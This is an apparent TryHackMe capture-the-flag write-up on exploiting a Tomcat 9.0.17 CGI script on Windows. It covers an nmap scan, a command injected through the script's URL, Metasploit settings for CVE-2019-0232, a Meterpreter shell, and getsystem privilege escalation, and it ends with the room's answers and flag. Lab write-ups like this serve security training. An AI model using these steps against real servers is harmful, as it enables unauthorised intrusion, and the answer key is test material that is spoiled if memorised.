#Day-12
....................................................................
====================================================================
Day 12: Ready, set, elf. - Prelude:

Christmas is fast approaching, yet, all remain silent at The Best Festival Company (TBFC). What gives?! The cheek of those elves - slacking at the festive period! Santa has no time for slackers in his workshop. After all, the sleigh won't fill itself, nor will the good and naughty lists be sorted. Santa has tasked you, Elf McEager, with whacking those elves back in line.
====================================================================
....................................................................
#Steps I aquire to gain acccess:
----------------------------------
lets nmap the target to get some basic enumeratioon going.
nmap -A -sC -sV -oN intial 10.10.206.126

by nmaping the target we found that there is tomcat server on the port 8080 and the server version is 9.0.17.

and on we found the cgi custom script on: http://10.10.206.126:8080/cgi-bin/elfwhacker.bat

the server is running Microsoft Windows Server 2019 Standard.
and tghe version of server is: 10.0.17763 N/A Build 17763
we found the above information by going on: http://10.10.206.126:8080/cgi-bin/elfwhacker.bat?&systeminfo

now lets search on the exploit-db or we can use searchsploit to search the exploit related to this tom cat version.

so we found the exploit which is: CVE-2019-0232

now lets set up the metploit to explit the cgi code exicution vulnarability.

 RHOST      : 10.10.206.126
 LHOST      : your tun0 ip
 TARGETURL  : /cgi-bin/elfwhacker.bat

 exploit

we go the meterpreter session.
now run the command: shell

now we have the shell of that server.

dir to list the file and we found our flag there.

more flag1.txt
the above windows command to show the file conntent in terminal.

now lets try to excalate the shell to admin level.

background this session:

now lets use the post exploits to excalate vertically.

use post/windows/escalate/getsystem

then set the options:

set SESSION 1

set the session id above now run it.

exploit.

now we have excalated the shell to admin level.

....................................................................
====================================================================
....................................................................

#1	What is the version number of the web server?
	Ans: 9.0.17

#2	What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)
	Ans: CVE-2019-0232

#3	Set your Metasploit settings appropriately and gain a foothold onto the deployed machine.
	Ans: No answer needed.

#4	What are the contents of flag1.txt
	Ans: thm{whacking_all_the_elves}

#5	Looking for a challenge? Try to find out some of the vulnerabilities present to escalate your privileges!
	Ans: use post/windows/excalate/getsystem

....................................................................
====================================================================